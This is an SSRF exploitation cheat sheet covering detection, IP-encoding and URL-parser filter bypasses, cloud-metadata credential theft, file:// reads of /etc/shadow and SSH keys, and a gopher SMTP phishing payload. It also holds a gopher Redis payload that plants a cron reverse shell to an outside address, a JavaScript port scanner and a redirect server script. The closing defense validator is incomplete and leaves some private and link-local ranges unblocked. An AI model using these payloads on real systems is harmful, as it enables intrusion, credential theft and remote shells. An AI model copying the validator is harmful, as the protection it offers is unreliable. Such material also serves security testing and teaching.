# SSRF

### Overview

**SSRF (Server-Side Request Forgery)** is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This enables attackers to interact with internal systems and bypass access controls.

**Why it's critical:**

* Access to internal systems behind firewalls
* Bypass authentication mechanisms
* Interact with cloud metadata services
* Port scanning internal networks
* Read local files
* Remote code execution in some cases

**Common vulnerable functionality:**

* URL fetching features
* PDF generators
* Image processors
* Webhooks
* File imports from URLs
* API proxies
* Document converters

**Impact:**

* Access to internal services
* Cloud credentials theft (AWS, Azure, GCP)
* Internal network enumeration
* Remote code execution
* Data exfiltration
* Bypass firewall rules

***

### Exploitation Workflow Summary

```
1. Discovery & Detection
   ├─ Identify URL parameters
   ├─ Test for external requests
   ├─ Confirm vulnerability
   └─ Map accessible services

2. Enumeration
   ├─ Internal network mapping
   ├─ Port scanning
   ├─ Service fingerprinting
   └─ Cloud metadata access

3. Filter Bypass
   ├─ IP encoding techniques
   ├─ DNS rebinding
   ├─ URL validation bypass
   └─ Protocol manipulation

4. Exploitation
   ├─ Access internal services
   ├─ Extract cloud credentials
   ├─ Read local files
   └─ Execute commands

5. Post-Exploitation
   ├─ Lateral movement
   ├─ Privilege escalation
   ├─ Persistence establishment
   └─ Data exfiltration
```

***

### Understanding SSRF

#### How It Works

**Vulnerable application flow:**

```
1. User provides URL: http://attacker.com
2. Server fetches: http://attacker.com
3. Server returns content to user
```

**SSRF attack flow:**

```
1. User provides URL: http://127.0.0.1/admin
2. Server fetches: http://127.0.0.1/admin
3. Server returns internal admin panel
```

**The vulnerability:**

* Server trusts user-provided URLs
* No validation of request destination
* Internal services accessible
* Can bypass firewall rules

#### Vulnerable Parameters

**Common parameter names:**

```
?url=
?uri=
?path=
?dest=
?redirect=
?continue=
?window=
?next=
?data=
?reference=
?site=
?html=
?validate=
?domain=
?callback=
?return=
?page=
?feed=
?host=
?port=
?to=
?out=
?view=
?dir=
?show=
?navigation=
```

***

### Detection Techniques

#### Basic Detection

**Test with external URL:**

```
http://target.com/fetch?url=http://burpcollaborator.net
```

**Check for DNS/HTTP callback:**

* Use Burp Collaborator
* Use interactsh
* Use your own server

**Indicators of SSRF:**

* Server makes external request
* Response contains external content
* Timing differences (port open vs closed)

#### Testing Internal Access

**Localhost access:**

```
http://target.com/fetch?url=http://127.0.0.1
http://target.com/fetch?url=http://localhost
```

**Expected response:**

* Different content than external URL
* Internal service response
* Admin panel access

#### Port Scanning

**Using Burp Intruder:**

**Position:**

```
http://target.com/fetch?url=http://127.0.0.1:§80§
```

**Payloads:**

```
22    (SSH)
80    (HTTP)
443   (HTTPS)
3306  (MySQL)
5432  (PostgreSQL)
6379  (Redis)
8080  (HTTP Alt)
9200  (Elasticsearch)
```

**Analysis:**

* Different response times
* Different content lengths
* Error messages vs success

***

### Basic Exploitation

#### Localhost Variations

**Standard localhost:**

```
http://127.0.0.1
http://localhost
http://0.0.0.0
```

**Alternative representations:**

```
http://127.1
http://127.0.1
http://0
http://[::1]
http://[::]
```

**Decimal notation:**

```
http://2130706433
(Converts to 127.0.0.1)
```

**Calculation:**

```
127 × 256³ + 0 × 256² + 0 × 256 + 1 = 2130706433
```

**Octal notation:**

```
http://017700000001
(Leading 0 indicates octal)
```

**Hexadecimal:**

```
http://0x7f000001
http://0x7f.0x0.0x0.0x1
```

#### Cloud Metadata Access

**AWS metadata (169.254.169.254):**

**Standard:**

```
http://169.254.169.254/latest/meta-data/
```

**Encoded variations:**

```
http://169.254.43518
(169*256 + 254 = 43518)

http://169.16689662
(169*256³ + 254*256² + 169*256 + 254)

http://0xA9.0xFE.0xA9.0xFE
(Hex: A9=169, FE=254)
```

**Retrieve credentials:**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
```

**Azure metadata:**

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**GCP metadata:**

```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
```

***

### Filter Bypass Techniques

#### IP Encoding Methods

**Decimal conversion:**

```
127.0.0.1 → 2130706433

Calculation:
127×(256³) + 0×(256²) + 0×256 + 1 = 2130706433
```

**Octal encoding:**

```
127.0.0.1 → 017700000001
127.0.0.1 → 0177.0.0.01
```

**Hexadecimal:**

```
127.0.0.1 → 0x7f000001
127.0.0.1 → 0x7f.0x0.0x0.0x1
```

**Mixed encoding:**

```
127.0.0.1 → 0x7f.0.0.1
127.0.0.1 → 0177.0.0.1
127.0.0.1 → 127.0.0x1
```

**Partial IP notation:**

```
127.0.0.1 → 127.1
127.0.0.1 → 127.0.1
```

#### URL Manipulation

**@ character abuse:**

```
http://target.com@127.0.0.1
http://target.com:80@127.0.0.1
http://target.com#@127.0.0.1
```

**What happens:**

* Browser/parser reads: username=target.com, host=127.0.0.1
* Validation checks "target.com" in URL
* Request goes to 127.0.0.1

**Subdomain tricks:**

```
http://127.0.0.1.target.com
http://target.com.127.0.0.1.nip.io
http://127.0.0.1.nip.io
```

**URL fragments:**

```
http://127.0.0.1#target.com
http://127.0.0.1?target.com
http://127.0.0.1/target.com
```

#### DNS Rebinding

**What is DNS rebinding?** DNS server returns different IPs on subsequent requests:

1. First request: Returns allowed IP (1.1.1.1)
2. Validation passes
3. Second request: Returns internal IP (127.0.0.1)
4. Server connects to internal IP

**Services for DNS rebinding:**

```
http://7f000001.1time.10seconds.xip.io
(Resolves to 127.0.0.1 after delay)
```

**Manual DNS rebinding setup:**

1. Control DNS server
2. Set short TTL (0 seconds)
3. First response: Allowed IP
4. Subsequent responses: Internal IP

#### Protocol Bypass

**Alternative protocols:**

```
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_
ldap://127.0.0.1:389/
tftp://127.0.0.1/
```

**Protocol confusion:**

```
//127.0.0.1
\\127.0.0.1
////127.0.0.1
\\\\127.0.0.1
http:127.0.0.1
https:127.0.0.1
```

***

### Advanced Exploitation

#### Gopher Protocol

**What is Gopher?**

* Allows arbitrary TCP data
* Can interact with various services
* Bypasses many filters

**Basic syntax:**

```
gopher://host:port/_data
```

**Redis exploitation:**

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

**MySQL exploitation:**

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01...
```

**SMTP exploitation:**

```
gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:%20Phishing%0d%0a%0d%0aClick%20here%0d%0a.%0d%0a
```

#### File Access

**Read local files:**

```
file:///etc/passwd
file:///etc/shadow
file:///var/log/apache2/access.log
file:///proc/self/environ
file:///home/user/.ssh/id_rsa
```

**Windows paths:**

```
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
```

**URL encoding for filters:**

```
file:/etc/passwd%3F/
file:/etc%252Fpasswd/
file:///etc/%3F/../passwd
```

#### Internal Service Exploitation

**Access internal web apps:**

```
http://127.0.0.1/admin
http://127.0.0.1:8080/manager
http://127.0.0.1:9200/_cat/indices
```

**Database access:**

```
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:27017
```

**Redis commands via Gopher:**

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/10.0.0.1/8080 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

***

### Blind SSRF Detection

#### Out-of-Band Techniques

**DNS exfiltration:**

```
http://target.com/fetch?url=http://burpcollaborator.net
```

**Check for DNS lookup on your server**

**HTTP callbacks:**

```python
# Simple HTTP server
python3 -m http.server 80
```

**Advanced callback server:**

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

class Logger(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Request from {self.client_address[0]}")
        print(f"[+] Path: {self.path}")
        print(f"[+] Headers: {self.headers}")
        self.send_response(200)
        self.end_headers()

HTTPServer(("0.0.0.0", 80), Logger).serve_forever()
```

#### Time-Based Detection

**Port scanning via timing:**

```
http://127.0.0.1:80  (Fast response = open)
http://127.0.0.1:999 (Slow/timeout = closed)
```

**Measure response times:**

* Open port: Immediate connection
* Closed port: Connection timeout
* Filtered port: No response

***

### PDF Generator SSRF

#### Detection

**Test for SSRF in PDF generation:**

```html
<iframe src="http://burpcollaborator.net"></iframe>
```

**Alternative methods:**

```html
<img src="http://burpcollaborator.net/test.png">
<script src="http://burpcollaborator.net/test.js"></script>
<link rel="stylesheet" href="http://burpcollaborator.net/test.css">
```

#### Local File Access

**Read local files:**

```html
<iframe src="file:///etc/passwd"></iframe>
```

**Windows files:**

```html
<iframe src="file:///C:/Windows/System32/drivers/etc/hosts"></iframe>
```

#### JavaScript-Based SSRF

**XMLHttpRequest:**

```html
<script>
var x = new XMLHttpRequest();
x.onload = function() {
    document.write(this.responseText);
};
x.open('GET', 'http://127.0.0.1:8080');
x.send();
</script>
```

**Fetch API:**

```html
<script>
fetch('http://127.0.0.1:8080')
    .then(r => r.text())
    .then(data => document.write(data));
</script>
```

**Read internal files:**

```html
<script>
var x = new XMLHttpRequest();
x.onload = function() {
    document.write(this.responseText);
};
x.open('GET', 'file:///etc/passwd');
x.send();
</script>
```

#### Complete Exploitation Example

**Port scan via PDF:**

```html
<html>
<script>
var ports = [22, 80, 443, 3306, 8080];
var results = [];

ports.forEach(port => {
    var start = new Date().getTime();
    var xhr = new XMLHttpRequest();
    
    xhr.timeout = 1000;
    xhr.ontimeout = function() {
        results.push(`Port ${port}: Closed/Filtered`);
    };
    
    xhr.onload = function() {
        var elapsed = new Date().getTime() - start;
        results.push(`Port ${port}: Open (${elapsed}ms)`);
    };
    
    xhr.open('GET', `http://127.0.0.1:${port}`, false);
    try {
        xhr.send();
    } catch(e) {}
});

document.write(results.join('<br>'));
</script>
</html>
```

***

### Exploitation Automation

#### Custom Redirect Server

**Python redirect script:**

```python
#!/usr/bin/env python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <port> <redirect_url>")
    sys.exit(1)

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', sys.argv[2])
        self.end_headers()
    
    def do_POST(self):
        self.do_GET()
    
    def log_message(self, format, *args):
        print(f"[+] Redirecting to: {sys.argv[2]}")

print(f"[*] Starting redirect server on port {sys.argv[1]}")
print(f"[*] Redirecting to: {sys.argv[2]}")
HTTPServer(("0.0.0.0", int(sys.argv[1])), Redirect).serve_forever()
```

**Usage:**

```bash
python3 redirect.py 80 http://127.0.0.1:8080
```

**Attack flow:**

1. Victim requests: `http://attacker.com`
2. Server redirects to: `http://127.0.0.1:8080`
3. Victim server follows redirect
4. Internal service accessed

***

### Real-World Examples

#### Example 1: AWS Metadata

**Scenario:** Application allows fetching images from URLs

**Attack:**

```
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Result:** AWS credentials exposed

**Exfiltrate credentials:**

```
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role
```

**Response:**

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

#### Example 2: Internal Service Access

**Scenario:** PDF generator accepts HTML with images

**Attack:**

```html
<img src="http://127.0.0.1:8080/admin">
```

**Result:** Access internal admin panel

#### Example 3: Redis Exploitation

**Scenario:** Application allows custom webhooks

**Attack:**

```
http://target.com/webhook?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

**Result:** Redis commands executed

***

### Defense & Prevention

**Input validation:**

```python
from urllib.parse import urlparse
import socket

ALLOWED_HOSTS = ['example.com', 'cdn.example.com']

def is_safe_url(url):
    parsed = urlparse(url)
    
    # Check scheme
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Check hostname
    if parsed.hostname not in ALLOWED_HOSTS:
        return False
    
    # Resolve and check IP
    try:
        ip = socket.gethostbyname(parsed.hostname)
        # Block private IPs
        if ip.startswith('127.') or ip.startswith('10.') or ip.startswith('192.168.'):
            return False
    except:
        return False
    
    return True
```

**Network segmentation:**

* Isolate application servers
* Firewall rules blocking internal access
* Use VLANs for separation

**Disable dangerous protocols:**

* Block file://
* Block gopher://
* Block dict://
* Allow only HTTP/HTTPS

**Cloud security:**

* Use IMDSv2 (AWS)
* Require authentication headers
* Limit metadata access

***

### Quick Reference

#### Basic Payloads

```
http://127.0.0.1
http://localhost
http://0
http://[::1]
```

#### Encoded IPs

```
http://2130706433
http://0x7f000001
http://017700000001
```

#### Cloud Metadata

```
http://169.254.169.254/latest/meta-data/
```

#### File Access

```
file:///etc/passwd
file:///C:/Windows/win.ini
```

#### Bypass Techniques

```
http://127.0.0.1.nip.io
http://target.com@127.0.0.1
http://127.1
```



